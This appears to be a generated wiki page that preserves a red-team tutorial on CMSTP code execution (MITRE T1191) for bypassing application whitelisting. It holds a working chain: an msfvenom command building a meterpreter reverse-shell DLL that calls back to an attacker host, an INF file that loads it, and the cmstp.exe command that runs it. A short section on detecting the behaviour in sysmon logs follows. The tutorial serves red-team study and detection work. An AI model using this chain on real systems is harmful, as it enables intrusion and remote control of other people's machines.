---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# CMSTP

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-execution-t1191-cmstp-code-execution` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/t1191-cmstp-code-execution.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [CMSTP](../../topics/offensive-security/cmstp.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-execution-t1191-cmstp-code-execution |
| name | CMSTP |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-execution/t1191-cmstp-code-execution.md |

## Preserved Source Material

````yaml
_asset_filenames:
- cmstp-kibana (1).png
- cmstp-rundll32.png
_body: "---\ndescription: CMSTP code execution - bypass application whitelisting.\n---\n\n# CMSTP\n\n## Execution\n\nGenerating\
  \ the a reverse shell payload as a DLL:\n\n{% code title=\"evil.dll\" %}\n```csharp\nmsfvenom -p windows/x64/meterpreter/reverse_tcp\
  \ LHOST=10.0.0.5 LPORT=443 -f dll > /root/tools/mitre/cmstp/evil.dll\n```\n{% endcode %}\n\nCreating a file that will be\
  \ loaded by CSMTP.exe binary that will in turn load our evil.dll:\n\n{% code title=\"f.inf\" %}\n```csharp\n[version]\n\
  Signature=$chicago$\nAdvancedINF=2.5\n \n[DefaultInstall_SingleUser]\nRegisterOCXs=RegisterOCXSection\n \n[RegisterOCXSection]\n\
  C:\\experiments\\cmstp\\evil.dll\n \n[Strings]\nAppAct = \"SOFTWARE\\Microsoft\\Connection Manager\"\nServiceName=\"mantvydas\"\
  \nShortSvcName=\"mantvydas\"\n```\n{% endcode %}\n\nInvoking the payload:\n\n```csharp\nPS C:\\experiments\\cmstp> cmstp.exe\
  \ /s .\\f.inf\n```\n\n## Observations\n\nRundll32 is spawned which then establishes the connection back to the attacker:\n\
  \n![](../../.gitbook/assets/cmstp-rundll32.png)\n\nA very privitive way of hunting for suspicious instances of rundll32\
  \ initiating connections would be skimming through the sysmon logs and looking for network connections being established\
  \ by rundll32 immediately/soon after it had been spawned by cmstp.\n\nNote how the connection was established one second\
  \ after the process creation. This behaviour depends on what the payload is supposed to do, but if the payload is a reverse\
  \ shell, it usually attempts connecting back immediately upon execution, which is exactly our case:\n\n![](../../.gitbook/assets/cmstp-kibana%20%281%29.png)\n\
  \n## References\n\n{% embed url=\"https://attack.mitre.org/wiki/Technique/T1191\" %}\n\n{% embed url=\"https://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/\"\
  \ %}"
_relative_path: offensive-security/code-execution/t1191-cmstp-code-execution.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/t1191-cmstp-code-execution.md
````
